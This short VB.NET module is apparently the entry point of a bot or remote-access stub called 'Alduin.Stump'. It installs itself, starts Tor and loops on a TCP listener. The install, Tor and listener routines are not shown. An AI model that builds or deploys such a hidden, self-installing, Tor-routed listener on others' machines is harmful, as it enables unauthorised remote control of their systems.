Imports Alduin.Stump.Alduin.Stump.Class.Network

Module Main
    Sub Main()
        Console.WriteLine("Installing") 'Debugging
        Install()
        StartTor()
        Console.WriteLine("Listening") 'Debugging
        Dim tcplistener = New TcpListen()
        While (True)
            tcplistener.TcpAsync()
        End While
    End Sub
End Module
